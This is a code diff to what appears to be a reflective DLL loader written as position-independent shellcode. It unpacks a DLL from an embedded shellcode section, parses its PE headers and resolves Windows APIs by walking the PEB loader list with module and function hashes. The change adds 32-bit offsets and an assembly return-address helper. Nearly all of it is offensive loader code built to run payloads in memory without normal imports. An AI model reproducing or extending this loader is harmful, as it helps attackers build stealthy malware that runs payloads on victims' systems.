@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <intrin.h>
 #include "pic_defs.h"
 #include "user_data.h"
 
@@ -56,6 +57,14 @@
 
 char _SHELLCODE_ [0] __attribute__((section("shellcode")));
 #define GETRESOURCE(x) (char *)&x
+
+#ifndef _WIN64
+__attribute__((naked, used))
+void * getretaddr(void)
+{
+    __asm__("mov (%esp), %eax\n\tret\n");
+}
+#endif
 
 /* ── PE section protection mapping ── */
 
@@ -157,6 +166,7 @@ void go(void) {
     char *sc_src = GETRESOURCE(_SHELLCODE_);
     DWORD dll_size = *(DWORD *)sc_src;
     BYTE *dll_raw = (BYTE *)(sc_src + 4);
+    __asm__ volatile("" : "+r"(dll_raw));
 
     /* ── Step 3: Parse PE headers ── */
 
@@ -442,12 +452,21 @@ FARPROC resolve(DWORD mod_hash, DWORD func_hash) {
     peb = (char *)__readfsdword(0x30);
 #endif
 
+#ifdef _WIN64
     char *ldr = *(char **)(peb + 0x18);
     char *head = ldr + 0x20;
+#else
+    char *ldr = *(char **)(peb + 0x0C);
+    char *head = ldr + 0x14;
+#endif
     char *curr = *(char **)head;
 
     while (curr != head) {
+#ifdef _WIN64
         WCHAR *name = *(WCHAR **)(curr + 0x40);
+#else
+        WCHAR *name = *(WCHAR **)(curr + 0x20);
+#endif
         if (!name) { curr = *(char **)curr; continue; }
 
         /* Extract base name from full path */
@@ -475,7 +494,11 @@ FARPROC resolve(DWORD mod_hash, DWORD func_hash) {
         }
 
         if (m_hash == mod_hash) {
+#ifdef _WIN64
             char *base = *(char **)(curr + 0x20);
+#else
+            char *base = *(char **)(curr + 0x10);
+#endif
             DWORD e_lfanew = *(DWORD *)(base + 0x3C);
             char *nthdr = base + e_lfanew;
 
